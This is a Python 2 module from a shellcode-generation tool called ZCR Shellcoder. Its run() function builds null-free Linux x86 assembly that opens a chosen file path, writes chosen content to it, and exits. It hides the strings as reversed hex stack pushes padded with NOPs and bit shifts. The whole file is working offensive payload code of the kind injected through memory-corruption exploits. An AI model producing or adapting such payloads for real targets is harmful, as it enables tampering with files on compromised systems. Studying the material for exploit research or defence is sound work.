#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
import binascii
def run(path_file,content):
	skip = 0
	if '8' in str(len(content)) or '9' in str(len(content)):
		length = str(hex(int(str(len(content)))))
		skip = 1
	if skip is 0:
		length = str(hex(int(str(len(content)),8)))
	if len(length) % 2 is not 0:
		length = length.replace('0x','0x0')
	if len(length) is 10:
		length = length + '\npop %edx\n'

	if len(length) is 8:
		length = length + '90\npop %edx\nshr $0x8,%edx\n'
	if len(length) is 6:
		length = length + '9090\npop %edx\nshr $0x10,%edx\n'
	if len(length) is 4:
		length = length + '909090\npop %edx\nshr $0x10,%edx\nshr $0x8,%edx\n'
	length = 'push $' + length


	m = len(path_file) - 1
	null = len(path_file) % 4	
	stack = ''
	while(m>=0):
	        stack += path_file[m]
	        m -= 1
	stack = stack.encode('hex')
	shr_counter = 0 
	shr_counter = len(stack) % 8
	zshr_counter = shr_counter
	shr = None
	if shr_counter is 2:
		shr = '\npop %ebx\nshr    $0x10,%ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:2] + '909090' + stack[2:]
	if shr_counter is 4:
		shr = '\npop %ebx\nshr    $0x10,%ebx\npush %ebx\n'
		stack = stack[0:4] + '9090' + stack[4:]
	if shr_counter is 6:
		shr = '\npop %ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:6] + '90' + stack[6:]
	zshr = shr
	m = len(stack)
	n = len(stack) / 8
	file_shellcode = ''
	shr_counter = len(stack) % 8
	if shr_counter is 0:
		shr_n = 0
		if len(path_file) >= 4:
			r = ''
			while(n is not 0):
				if shr is not None:
					shr_n += 1
					zx = m - 8
					file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
					m -= 8
					n = n - 1
					shr = None
				if shr is None:
					shr_n += 1
					zx = m - 8
					file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
					m -= 8
					n = n - 1
			if zshr is None:
				file_z = file_shellcode
			if zshr is not None:
				rep1 = file_shellcode[:16]
				rep2 = rep1 + zshr
				file_z = file_shellcode.replace(rep1,rep2)
			file_name = file_z
		if len(path_file) <= 3:
			m = len(path_file) - 1
			stack = ''
			while(m>=0):
					stack += path_file[m]
					m -= 1
			path_file = '0x' + stack.encode('hex')
			if len(path_file) % 2 is not 0:
				path_file = path_file.replace('0x','0x0')
			if len(path_file) is 8:
				path_file = path_file + '90\npop %ebx\nshr $0x8,%ebx\npush %ebx\n'
			if len(path_file) is 6:
				path_file = path_file + '9090\npop %ebx\nshr $0x10,%ebx\npush %ebx\n'
			if len(path_file) is 4:
				path_file = path_file + '909090\npop %ebx\nshr $0x10,%ebx\nshr $0x8,%ebx\npush %ebx\n'
			file_name = 'push $' + path_file
				

			
	if len(content) >= 4:
		m = len(content) - 1
		stack = ''
		while(m>=0):
				stack += content[m]
				m -= 1
		stack = stack.encode('hex')
		shr_counter = 0 
		shr_counter = len(stack) % 8
		zshr_counter = shr_counter
		shr = None
		if shr_counter is 2:
			shr = '\npop %ecx\nshr    $0x10,%ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:2] + '909090' + stack[2:]
		if shr_counter is 4:
			shr = '\npop %ecx\nshr    $0x10,%ecx\npush %ecx\n'
			stack = stack[0:4] + '9090' + stack[4:]
		if shr_counter is 6:
			shr = '\npop %ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:6] + '90' + stack[6:]
		zshr = shr
		m = len(stack)
		n = len(stack) / 8
		file_shellcode = ''
		shr_counter = len(stack) % 8
		if shr_counter is 0:
			shr_n = 0
			r = ''
			while(n is not 0):
				if shr is not None:
					shr_n += 1
					zx = m - 8
					file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
					m -= 8
					n = n - 1
					shr = None
				if shr is None:
					shr_n += 1
					zx = m - 8
					file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
					m -= 8
					n = n - 1
					
					
			if zshr is None:
				file_z = file_shellcode
			if zshr is not None:
				rep1 = file_shellcode[:16]
				rep2 = rep1 + zshr
				file_z = file_shellcode.replace(rep1,rep2)
			content = file_z
	if len(content) <= 3:
		m = len(content) - 1
		stack = ''
		while(m>=0):
				stack += content[m]
				m -= 1
		content = '0x' + stack.encode('hex')
		if len(content) % 2 is not 0:
			content = content.replace('0x','0x0')
		if len(content) is 8:
			content = content + '90\npop %ecx\nshr $0x8,%ecx\npush %ecx\n'
		if len(content) is 6:
			content = content + '9090\npop %ecx\nshr $0x10,%ecx\npush %ecx\n'
		if len(content) is 4:
			content = content + '909090\npop %ecx\nshr $0x10,%ecx\nshr $0x8,%ecx\npush %ecx\n'
		content = 'push $' + content
	if null is not 0:
		null = ''
	if null is 0:
		null = 'xor %ebx,%ebx\npush %ebx\n'
	shellcode = '''
push   $0x5
pop    %%eax
%s
%s
mov    %%esp,%%ebx
push   $0x4014141
pop    %%ecx
shr    $0x10,%%ecx
int    $0x80
mov    %%eax,%%ebx
push   $0x4
pop    %%eax
%s
mov %%esp,%%ecx
%s
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(str(null),str(file_name),str(content),str(length))
	return shellcode